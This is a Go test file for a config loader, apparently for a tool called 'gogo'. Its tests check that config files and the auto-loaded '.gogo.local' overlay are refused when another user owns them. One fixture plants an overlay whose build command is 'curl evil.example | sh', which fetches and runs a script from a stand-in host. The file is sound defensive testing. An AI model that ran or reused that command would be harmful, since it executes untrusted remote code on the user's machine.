package config

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func stubConfigFileOwner(t *testing.T, owned bool, ownerUID int) {
	t.Helper()
	prev := configFileOwner
	configFileOwner = func(string) (bool, int, error) { return owned, ownerUID, nil }
	t.Cleanup(func() { configFileOwner = prev })
}

func TestFindMetaFileUpRefusesForeignOwnedConfig(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gogo"), []byte("{}"), 0o644))

	stubConfigFileOwner(t, false, 4242)

	_, err := FindMetaFileUp(dir)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "owned by another user")
	assert.Contains(t, err.Error(), ".gogo")
}

func TestFindMetaFileUpAllowsOwnedConfig(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gogo"), []byte("{}"), 0o644))

	stubConfigFileOwner(t, true, os.Geteuid())

	path, err := FindMetaFileUp(dir)
	require.NoError(t, err)
	assert.Equal(t, filepath.Join(dir, ".gogo"), path)
}

func TestGetMetaDirPropagatesForeignRefusal(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gogo"), []byte("{}"), 0o644))

	stubConfigFileOwner(t, false, 4242)

	_, err := GetMetaDir(dir)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "owned by another user")
}

func TestOSConfigFileOwnerSelfCreatedFileIsOwned(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, ".gogo")
	require.NoError(t, os.WriteFile(path, []byte("{}"), 0o644))

	owned, _, err := osConfigFileOwner(path)
	require.NoError(t, err)
	assert.True(t, owned, "a file created by the test process must be owned by it")
}

// stubConfigFileOwnerByPath makes ownership depend on the file, so a test can
// own the primary config while a sibling overlay belongs to someone else.
func stubConfigFileOwnerByPath(t *testing.T, foreign map[string]int) {
	t.Helper()
	prev := configFileOwner
	configFileOwner = func(path string) (bool, int, error) {
		if uid, ok := foreign[filepath.Base(path)]; ok {
			return false, uid, nil
		}
		return true, os.Geteuid(), nil
	}
	t.Cleanup(func() { configFileOwner = prev })
}

func TestReadMetaConfigRefusesForeignOwnedLocalOverlay(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gogo"),
		[]byte(`{"projects":{"a":"urlA"}}`), 0o644))
	// A .gogo.local planted by another user is auto-loaded like the primary
	// config and may define commands, so it gets the same ownership guard.
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gogo.local"),
		[]byte(`{"commands":{"build":"curl evil.example | sh"}}`), 0o644))

	stubConfigFileOwnerByPath(t, map[string]int{".gogo.local": 4242})

	_, err := ReadMetaConfig(dir, nil)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "owned by another user")
	assert.Contains(t, err.Error(), ".gogo.local")
}

func TestReadMetaConfigAllowsOwnedLocalOverlay(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gogo"),
		[]byte(`{"projects":{"a":"urlA"}}`), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gogo.local"),
		[]byte(`{"projects":{"b":"urlB"}}`), 0o644))

	stubConfigFileOwnerByPath(t, nil)

	result, err := ReadMetaConfig(dir, nil)
	require.NoError(t, err)
	assert.Equal(t, "urlB", result.Config.Projects["b"])
}

func TestReadMetaConfigDoesNotOwnerCheckExplicitOverlays(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gogo"),
		[]byte(`{"projects":{"a":"urlA"}}`), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gogo.devops"),
		[]byte(`{"projects":{"x":"urlX"}}`), 0o644))

	stubConfigFileOwnerByPath(t, map[string]int{".gogo.devops": 4242})

	result, err := ReadMetaConfig(dir, []string{".gogo.devops"})
	require.NoError(t, err, "an overlay named with -f is the user's own choice")
	assert.Equal(t, "urlX", result.Config.Projects["x"])
}
